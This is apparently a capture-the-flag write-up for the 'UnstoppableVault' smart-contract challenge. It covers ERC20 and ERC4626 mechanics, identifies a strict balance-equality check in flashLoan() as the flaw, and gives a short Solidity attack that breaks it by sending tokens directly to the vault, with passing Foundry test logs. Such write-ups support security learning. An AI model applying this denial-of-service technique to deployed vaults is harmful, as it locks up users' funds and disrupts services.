# UnstoppableVault

## Introduction
This challenge brings together several important concepts in Ethereum smart contract development:

- ERC20 Standard – understanding how balanceOf and totalSupply are updated by core functions such as transfer, transferFrom, _mint, and _burn.

- ERC4626 Tokenized Vaults – how vaults track totalAssets, issue shares, and expose standardized deposit/withdrawal logic.

- Flash Loans – mechanisms that allow borrowing without collateral, fee calculation, and repayment within a single transaction.

- Security Patterns – the use of reentrancy guards, access control checks, and pause functionality to protect vault integrity.

## Technical Background
Understand how totalSupply and balanceOf change in the ERC20 standard implementation.

- transfer()

Transfers tokens from the caller to a specified recipient. It modifies only balanceOf[from] and balanceOf[to], without affecting totalSupply.
```solidity
    function transfer(address to, uint256 amount) public virtual returns (bool) {
        balanceOf[msg.sender] -= amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(msg.sender, to, amount);

        return true;
    }
```

- _mint()

Creates new tokens and assigns them to a specified account. This function increases both totalSupply and balanceOf[to].
```solidity
    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(address(0), to, amount);
    }
```

## Key Insight

The bug with function flashLoan() in contract UnstoppableVault:
```solidity
    uint256 balanceBefore = totalAssets();
    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

## Solution

The attack code with function test_unstoppable():
```solidity
    uint256 _amount = token.balanceOf(player);
    token.transfer(address(vault), _amount);
```

## Test result
```bash
# forge test -vv --mp test/unstoppable/Unstoppable.t.sol
[⠆] Compiling...
[⠒] Compiling 1 files with Solc 0.8.25
[⠘] Solc 0.8.25 finished in 1.28s
Compiler run successful!

Ran 2 tests for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
[PASS] test_assertInitialState() (gas: 57303)
[PASS] test_unstoppable() (gas: 78741)
Logs:
  ### test_unstoppable start ###

  #1 Before attack
  totalAssets in vault: 1000000
  totalSupply in vault: 1000000

  #2 Run attack

  #3 After attack
  totalAssets in vault: 1000010
  totalSupply in vault: 1000000

  ### test_unstoppable end ###

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.15ms (414.71µs CPU time)

Ran 1 test suite in 6.83ms (1.15ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```